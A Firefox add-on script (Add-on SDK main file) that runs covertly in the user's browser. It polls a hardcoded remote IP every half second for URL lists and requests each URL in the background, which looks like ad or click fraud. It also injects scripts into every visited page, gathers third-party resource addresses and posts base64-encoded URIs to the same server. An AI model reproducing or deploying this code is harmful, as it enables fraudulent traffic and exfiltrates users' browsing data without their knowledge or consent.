var data = require("sdk/self").data;
var pageMod = require("sdk/page-mod");
var tabs = require("sdk/tabs");
var Request = require("sdk/request").Request;
var { setTimeout, setInterval } = require("sdk/timers");

var serverUrl = "http://95.85.11.226:8080"
var addUris = null;

// process retrieved addUris
function procUris(){
  var nV = 0;
  addUris.forEach(function(u) {
    nV++;
    try {

      Request({ 
        url: u,
        onComplete: function(response) {
          nV--;
          if (nV == 0)
	    addUris = null;
        }
      })
      .get();
    } catch (e) {nV--;}
  });
};

// retrive addUris
setInterval(function() {
  if (addUris == null) {

    // retrieve add urls if we arent already processing some
    Request({
      url: String.concat(serverUrl, "/r"),
      onComplete: function(response) {
        if (response.status == 200){ 
	    addUris = response.text.split("\n");
	    setTimeout(procUris,0);
        }
      }
    }).get();
  }
}, 500);

pageMod.PageMod({
  include: "*",
  contentScriptFile: ["./s1.js", "./base64.min.js"],
  onAttach: function(worker) {
    worker.port.emit("getElements", "iframe");
    worker.port.emit("getElements", "img");
    worker.port.emit("getElements", "script");
    worker.port.on("ne", function(b64uri) {
	Request({
	  url: String.concat(serverUrl, "/p"),
	  headers: {u: b64uri}
	})
	.post();
    });
    worker.port.on("gotElement", function(tag, src) {
      if (src == undefined || src == null)
      	return;

      var a1 = getHostName(worker.tab.url);
      var a2 = getHostName(src);
      if (a1 != null && a2 != null && !endsWith(a2,a1)) {
	worker.port.emit("b64c", src);
      }
    });
  }
});

function endsWith(str, suffix) {
  return str.indexOf(suffix, str.length - suffix.length) !== -1;
}

function getHostName(url) {
  var match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
  if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
    return match[2];
  }
  else {
    return null;
  }
}

